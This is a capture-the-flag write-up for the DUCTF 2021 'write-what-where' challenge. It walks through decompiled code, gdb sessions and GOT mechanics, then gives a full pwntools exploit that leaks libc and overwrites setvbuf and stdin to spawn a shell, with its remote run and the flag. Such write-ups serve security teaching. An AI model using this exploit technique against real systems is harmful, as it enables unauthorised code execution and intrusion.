# write-what-where

## Description

You've got one write. What do you do?

Author: joseph#8210

nc pwn-2021.duc.tf 31920

## Analysis
IDA:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _DWORD *v3; // [rsp+0h] [rbp-30h]
  int buf; // [rsp+Ch] [rbp-24h] BYREF
  char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("write");
  puts("what?");
  read(0, &buf, 4uLL);
  puts("where?");
  read(0, nptr, 9uLL);
  v3 = (_DWORD *)atoi(nptr);
  *v3 = buf;
  exit(0);
}

int init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  return setvbuf(_bss_start, 0LL, 2, 0LL);
}
```

We can write anything at any address, but *only 4 bytes*.
This limits our targets to write (because writing only 4 bytes can result in an invalid address).
We are also provided with the libc on the target system, so most probably it's a ret2libc attack.
`main` doesn't return (because it calls `exit`), so the only possibility is overwriting
entries in the GOT. We can overwrite `exit` with `main` so we get infinite writes.
Let's see what happens to functions in GOT in gdb:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000004011a9 <+0>:     push   rbp
   0x00000000004011aa <+1>:     mov    rbp,rsp
   0x00000000004011ad <+4>:     sub    rsp,0x30
   0x00000000004011b1 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00000000004011ba <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004011be <+21>:    xor    eax,eax
   0x00000000004011c0 <+23>:    mov    eax,0x0
   0x00000000004011c5 <+28>:    call   0x401166 <init>
   0x00000000004011ca <+33>:    lea    rax,[rip+0xe33]        # 0x402004
   0x00000000004011d1 <+40>:    mov    rdi,rax
   0x00000000004011d4 <+43>:    call   0x401030 <puts@plt>
   0x00000000004011d9 <+48>:    lea    rax,[rip+0xe2a]        # 0x40200a
   0x00000000004011e0 <+55>:    mov    rdi,rax
   0x00000000004011e3 <+58>:    call   0x401030 <puts@plt>
   0x00000000004011e8 <+63>:    lea    rax,[rbp-0x24]
   0x00000000004011ec <+67>:    mov    edx,0x4
   0x00000000004011f1 <+72>:    mov    rsi,rax
   0x00000000004011f4 <+75>:    mov    edi,0x0
   0x00000000004011f9 <+80>:    call   0x401040 <read@plt>
   0x00000000004011fe <+85>:    lea    rax,[rip+0xe0b]        # 0x402010
   0x0000000000401205 <+92>:    mov    rdi,rax
   0x0000000000401208 <+95>:    call   0x401030 <puts@plt>
   0x000000000040120d <+100>:   lea    rax,[rbp-0x20]
   0x0000000000401211 <+104>:   mov    edx,0x9
   0x0000000000401216 <+109>:   mov    rsi,rax
   0x0000000000401219 <+112>:   mov    edi,0x0
   0x000000000040121e <+117>:   call   0x401040 <read@plt>
   0x0000000000401223 <+122>:   lea    rax,[rbp-0x20]
   0x0000000000401227 <+126>:   mov    rdi,rax
   0x000000000040122a <+129>:   call   0x401060 <atoi@plt>
   0x000000000040122f <+134>:   cdqe   
   0x0000000000401231 <+136>:   mov    QWORD PTR [rbp-0x30],rax
   0x0000000000401235 <+140>:   lea    rdx,[rbp-0x24]
   0x0000000000401239 <+144>:   mov    rax,QWORD PTR [rbp-0x30]
   0x000000000040123d <+148>:   mov    edx,DWORD PTR [rdx]
   0x000000000040123f <+150>:   mov    DWORD PTR [rax],edx
   0x0000000000401241 <+152>:   mov    edi,0x0
   0x0000000000401246 <+157>:   call   0x401070 <exit@plt>
End of assembler dump.
gdb-peda$ break *(main+43)
Breakpoint 1 at 0x4011d4
gdb-peda$ r
Starting program: /home/kali/Downloads/write-what-where 
[----------------------------------registers-----------------------------------]
RAX: 0x402004 --> 0x6877006574697277 ('write')
RBX: 0x0 
RCX: 0xc00 ('')
RDX: 0x0 
RSI: 0x0 
RDI: 0x402004 --> 0x6877006574697277 ('write')
RBP: 0x7fffffffdf40 --> 0x401250 (<__libc_csu_init>:    endbr64)
RSP: 0x7fffffffdf10 --> 0x0 
RIP: 0x4011d4 (<main+43>:       call   0x401030 <puts@plt>)
R8 : 0x0 
R9 : 0x7ffff7fe21b0 (<_dl_fini>:        push   rbp)
R10: 0xfffffffffffff285 
R11: 0x7ffff7e65cd0 (<__GI__IO_setvbuf>:        push   r14)
R12: 0x401080 (<_start>:        endbr64)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011c5 <main+28>:  call   0x401166 <init>
   0x4011ca <main+33>:  lea    rax,[rip+0xe33]        # 0x402004
   0x4011d1 <main+40>:  mov    rdi,rax
=> 0x4011d4 <main+43>:  call   0x401030 <puts@plt>
   0x4011d9 <main+48>:  lea    rax,[rip+0xe2a]        # 0x40200a
   0x4011e0 <main+55>:  mov    rdi,rax
   0x4011e3 <main+58>:  call   0x401030 <puts@plt>
   0x4011e8 <main+63>:  lea    rax,[rbp-0x24]
Guessed arguments:
arg[0]: 0x402004 --> 0x6877006574697277 ('write')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf10 --> 0x0 
0008| 0x7fffffffdf18 --> 0x0 
0016| 0x7fffffffdf20 --> 0x401250 (<__libc_csu_init>:   endbr64)
0024| 0x7fffffffdf28 --> 0x401080 (<_start>:    endbr64)
0032| 0x7fffffffdf30 --> 0x7fffffffe030 --> 0x1 
0040| 0x7fffffffdf38 --> 0x2f4bcebba0f8200 
0048| 0x7fffffffdf40 --> 0x401250 (<__libc_csu_init>:   endbr64)
0056| 0x7fffffffdf48 --> 0x7ffff7e15d0a (<__libc_start_main+234>:       mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004011d4 in main ()
gdb-peda$ p 'puts@got.plt'
$1 = (<text from jump slot in .got.plt, no debug info>) 0x401036 <puts@plt+6>
gdb-peda$ ni
write
[----------------------------------registers-----------------------------------]
RAX: 0x6 
RBX: 0x0 
RCX: 0x7ffff7eddf33 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7fae723 --> 0xfb0670000000000a 
RDI: 0x7ffff7fb0670 --> 0x0 
RBP: 0x7fffffffdf40 --> 0x401250 (<__libc_csu_init>:    endbr64)
RSP: 0x7fffffffdf10 --> 0x0 
RIP: 0x4011d9 (<main+48>:       lea    rax,[rip+0xe2a]        # 0x40200a)
R8 : 0x6 
R9 : 0x7ffff7fe21b0 (<_dl_fini>:        push   rbp)
R10: 0xfffffffffffff285 
R11: 0x246 
R12: 0x401080 (<_start>:        endbr64)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011ca <main+33>:  lea    rax,[rip+0xe33]        # 0x402004
   0x4011d1 <main+40>:  mov    rdi,rax
   0x4011d4 <main+43>:  call   0x401030 <puts@plt>
=> 0x4011d9 <main+48>:  lea    rax,[rip+0xe2a]        # 0x40200a
   0x4011e0 <main+55>:  mov    rdi,rax
   0x4011e3 <main+58>:  call   0x401030 <puts@plt>
   0x4011e8 <main+63>:  lea    rax,[rbp-0x24]
   0x4011ec <main+67>:  mov    edx,0x4
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf10 --> 0x0 
0008| 0x7fffffffdf18 --> 0x0 
0016| 0x7fffffffdf20 --> 0x401250 (<__libc_csu_init>:   endbr64)
0024| 0x7fffffffdf28 --> 0x401080 (<_start>:    endbr64)
0032| 0x7fffffffdf30 --> 0x7fffffffe030 --> 0x1 
0040| 0x7fffffffdf38 --> 0x2f4bcebba0f8200 
0048| 0x7fffffffdf40 --> 0x401250 (<__libc_csu_init>:   endbr64)
0056| 0x7fffffffdf48 --> 0x7ffff7e15d0a (<__libc_start_main+234>:       mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000004011d9 in main ()
gdb-peda$ p 'puts@got.plt'
$2 = (<text from jump slot in .got.plt, no debug info>) 0x7ffff7e655f0 <__GI__IO_puts>
gdb-peda$ 
```

Let's take `puts` for example. Before the function is called, the GOT entry is 0x401036.
After the function is called, the entry is 0x7ffff7e655f0. Why is that? Because libc is dynamically linked
and the linker resolves functions' addresses at runtime and caches them in the GOT. 
When we call a libc function, we call the address in the PLT, that checks whether the real address was resolved.
If it was, it calls the address, if not, it calls the linker. Before the function is called, the entry fits inside 4 bytes. After the
function is resolved, it doesn't fit anymore. The point is we cannot overwrite a libc function (after it is resolved) in one iteration
(if the function is called again), because it will result in a half-overwritten invalid address. But we can overwrite
it in two iterations if the function is not called in between. A good candidate is `init`: it doesn't do anything crucial 
to the workflow. It contains calls to `setvbuf`. The first argument is `stdin`/`stdout` which is address that we can control.
It makes the perfect match for calling `system("/bin/sh")`, as we can control both the function address and the first argument.

Also, we need to leak an address in the libc, because ASLR will mount libc at a random base address. 
We can do this by calling `puts@plt(puts@got)`.


Idea of the exploit:
- overwrite `exit` to an address in `main` after the call to `init` (so `init` doesn't get called in between)
- overwrite `setvbuf` to `puts@plt`
- overwrite `stdin` to `puts@got`
- overwrite `exit` to `main` so `init` gets called to leak the address
- get the leaked address and calculate libc base
- overwrite `exit` to not call `init` 
- calculate the addresses of `system` and `/bin/sh`
- overwrite `setvbuf` to `system`
- overwrite `stdin` to `"/bin/sh"`
- overwrite `exit` to `main` 
- profit

```python
from pwn import *

context.log_level = 'debug'

def to_str_9(n):
    s = str(n)
    return str.encode(s).ljust(9, b"\x00")

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
binary = ELF("./write-what-where")

main = binary.sym['main']
after_init = main + 33
before_init = main + 28
exit_got = binary.got['exit']
stdin_got = binary.got['stdin']
stdout_got = binary.got['stdout']
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
setvbuf_got = binary.got['setvbuf']

def send(r, a, b):
    r.recvline()
    r.recvline()
    r.send(p32(a))
    r.recvline()
    r.send(to_str_9(b))

r = process("./write-what-where")
send(r, after_init, exit_got)
log.info("exit -> after init")

send(r, puts_got, stdin_got)
send(r, 0, stdin_got + 4)
log.info("stdin -> puts got")

send(r, puts_plt, setvbuf_got)
send(r, 0, setvbuf_got + 4)
log.info("setvbuf -> puts plt")

send(r, main, exit_got)
log.info("exit -> main")

leak = u64(r.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}") 
libc_base = leak - libc.sym['puts']
log.info(f"{hex(libc_base)=}")
system = libc_base + libc.sym['system']
log.info(f"{hex(system)=}")
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
log.info(f"{hex(bin_sh)=}")
r.recvline()

send(r, after_init, exit_got)
log.info("exit -> after init")

send(r, system & 0xFFFFFFFF, setvbuf_got)
send(r, system >> 32, setvbuf_got + 4)
log.info("setvbuf -> system")

send(r, bin_sh & 0xFFFFFFFF, stdin_got)
send(r, bin_sh >> 32, stdin_got + 4)
log.info("stdin -> /bin/sh")

send(r, main, exit_got)
log.info("exit -> main")

r.interactive()
```

After it works locally, replace the path to libc to the provided one, and open a remote to the server

```
[*] '/home/kali/Downloads/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/kali/Downloads/write-what-where'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './write-what-where' argv=[b'./write-what-where'] : pid 3505
[+] Opening connection to pwn-2021.duc.tf on port 31920: Done
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  ca 11 40 00                                         │··@·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 34 34 00  00                        │4210│744·│·│
    00000009
[*] exit -> after init
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  18 40 40 00                                         │·@@·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 38 34 00  00                        │4210│784·│·│
    00000009
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    0 * 0x4
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 38 38 00  00                        │4210│788·│·│
    00000009
[*] stdin -> puts got
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  30 10 40 00                                         │0·@·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 32 38 00  00                        │4210│728·│·│
    00000009
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    0 * 0x4
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 33 32 00  00                        │4210│732·│·│
    00000009
[*] setvbuf -> puts plt
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  a9 11 40 00                                         │··@·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 34 34 00  00                        │4210│744·│·│
    00000009
[*] exit -> main
[DEBUG] Received 0x18 bytes:
    00000000  d0 09 28 b2  e7 7f 0a 87  28 ad fb 0a  77 72 69 74  │··(·│····│(···│writ│
    00000010  65 0a 77 68  61 74 3f 0a                            │e·wh│at?·│
    00000018
[*] hex(leak)='0x7fe7b22809d0'
[*] hex(libc_base)='0x7fe7b2200000'
[*] hex(system)='0x7fe7b224fa60'
[*] hex(bin_sh)='0x7fe7b23abf05'
[DEBUG] Sent 0x4 bytes:
    00000000  ca 11 40 00                                         │··@·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 34 34 00  00                        │4210│744·│·│
    00000009
[*] exit -> after init
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  60 fa 24 b2                                         │`·$·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 32 38 00  00                        │4210│728·│·│
    00000009
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  e7 7f 00 00                                         │····│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 33 32 00  00                        │4210│732·│·│
    00000009
[*] setvbuf -> system
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  05 bf 3a b2                                         │··:·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 38 34 00  00                        │4210│784·│·│
    00000009
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  e7 7f 00 00                                         │····│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 38 38 00  00                        │4210│788·│·│
    00000009
[*] stdin -> /bin/sh
[DEBUG] Received 0xc bytes:
    b'write\n'
    b'what?\n'
[DEBUG] Sent 0x4 bytes:
    00000000  a9 11 40 00                                         │··@·│
    00000004
[DEBUG] Received 0x7 bytes:
    b'where?\n'
[DEBUG] Sent 0x9 bytes:
    00000000  34 32 31 30  37 34 34 00  00                        │4210│744·│·│
    00000009
[*] exit -> main
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xd bytes:
    b'flag.txt\n'
    b'pwn\n'
flag.txt
pwn
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x25 bytes:
    b'DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}\n'
DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}
```